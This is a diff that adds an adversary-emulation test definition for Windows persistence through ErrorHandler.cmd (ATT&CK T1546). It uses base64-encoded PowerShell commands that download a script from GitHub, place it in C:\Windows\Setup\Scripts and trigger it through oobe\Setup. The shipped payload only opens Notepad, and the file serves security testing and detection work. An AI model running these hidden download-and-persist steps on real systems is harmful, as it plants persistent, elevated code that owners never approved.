@@ -1,0 +1,24 @@
+- id: 13a5bc4d-2326-58f2-954c-75a71bb1f9ed
+  name: Soumaia ART Tests - Persistence via ErrorHandler.cmd script execution
+  description: 'Create persistence by triggering script within ErrorHandler.cmd upon the execution of specific binaries within the oobe directory.
+
+    Upon test execution, Setup.exe will be executed to further execute script within ErrorHandlercmd to launch Notepad. (requires elevation)'
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1546
+    name: Event Triggered Execution
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgAC4AXABFAHIAcgBvAHIASABhAG4AZABsAGUAcgAuAGMAbQBkACkAIAB7ACAAZQB4AGkAdAAgADAAfQAgAGUAbABzAGUAIAB7ACAAZQB4AGkAdAAgADEAfQAKAA==
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAiAC4AXABzAHIAYwAiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABpAGcAbgBvAHIAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AcgBlAGQAYwBhAG4AYQByAHkAYwBvAC8AYQB0AG8AbQBpAGMALQByAGUAZAAtAHQAZQBhAG0ALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AYQB0AG8AbQBpAGMAcwAvAFQAMQA1ADQANgAvAHMAcgBjAC8ARQByAHIAbwByAEgAYQBuAGQAbABlAHIALgBjAG0AZAAiACAALQBPAHUAdABGAGkAbABlACAAIgAuAFwARQByAHIAbwByAEgAYQBuAGQAbABlAHIALgBjAG0AZAAiACAAIAAgACAAIAAgAAoA
+          }
+          Copy-Item -Path .\ErrorHandler.cmd -Destination C:\Windows\Setup\Scripts\ErrorHandler.cmd
+          C:\windows\System32\oobe\Setup
+        cleanup: |-
+          Remove-Item C:\Windows\Setup\Scripts\ErrorHandler.cmd
+        payloads:
+        - ErrorHandler.cmd
+        - src
